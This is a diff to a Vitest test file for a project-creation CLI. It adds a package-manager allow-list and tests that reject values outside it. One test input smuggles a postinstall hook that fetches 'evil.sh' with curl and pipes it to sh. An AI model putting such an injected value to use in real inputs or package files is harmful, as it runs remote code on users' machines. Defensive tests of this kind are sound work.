@@ -52,15 +52,22 @@ const getPreferredPackageManager = vi.fn(() => "yarn");
 const setPackageManager = vi.fn();
 const getPackageManager = vi.fn(() => "yarn");
 
-vi.mock("../src/helpers/package-manager", () => ({
-  detectPackageManagers: (...args: unknown[]) => detectPackageManagers(...args),
-  getSystemPackageManagers: (...args: unknown[]) =>
-    getSystemPackageManagers(...args),
-  getPreferredPackageManager: (...args: unknown[]) =>
-    getPreferredPackageManager(...args),
-  setPackageManager: (...args: unknown[]) => setPackageManager(...args),
-  getPackageManager: (...args: unknown[]) => getPackageManager(...args),
-}));
+vi.mock("../src/helpers/package-manager", () => {
+  const allowed = ["npm", "yarn", "pnpm", "bun"];
+
+  return {
+    detectPackageManagers: (...args: unknown[]) =>
+      detectPackageManagers(...args),
+    getSystemPackageManagers: (...args: unknown[]) =>
+      getSystemPackageManagers(...args),
+    getPreferredPackageManager: (...args: unknown[]) =>
+      getPreferredPackageManager(...args),
+    setPackageManager: (...args: unknown[]) => setPackageManager(...args),
+    getPackageManager: (...args: unknown[]) => getPackageManager(...args),
+    ALLOWED_PACKAGE_MANAGERS: allowed,
+    isValidPackageManager: (value: string) => allowed.includes(value),
+  };
+});
 
 // --- app path reservation ----------------------------------------------------
 const getAppPath = vi.fn(() => "/tmp/reserved-app");
@@ -427,6 +434,35 @@ describe("createNonInteractive (--yes)", () => {
     expect(cancel).toHaveBeenCalledWith(
       "--yes requires a project name (first argument or --name=<name>)",
     );
+  });
+
+  it("accepts every allow-listed --pm value", async () => {
+    for (const pm of ["npm", "yarn", "pnpm", "bun"]) {
+      setPackageManager.mockClear();
+      cancel.mockClear();
+
+      await createNewApp({ yes: true, name: "app", pm });
+
+      expect(cancel).not.toHaveBeenCalled();
+      expect(setPackageManager).toHaveBeenCalledWith(pm);
+    }
+  });
+
+  it("exits 1 on a --pm value outside the allow-list instead of reaching setPackageManager", async () => {
+    await expect(
+      createNewApp({
+        yes: true,
+        name: "app",
+        pm: 'pnpm","postinstall":"curl${IFS}evil.sh|sh#',
+      }),
+    ).rejects.toThrow(ProcessExit);
+
+    expect(cancel).toHaveBeenCalledWith(
+      expect.stringContaining("Unknown package manager"),
+    );
+    expect(setPackageManager).not.toHaveBeenCalled();
+    expect(createWarlockApp).not.toHaveBeenCalled();
+    expect(exitSpy).toHaveBeenCalledWith(1);
   });
 
   it("exits 1 on an unknown database driver", async () => {
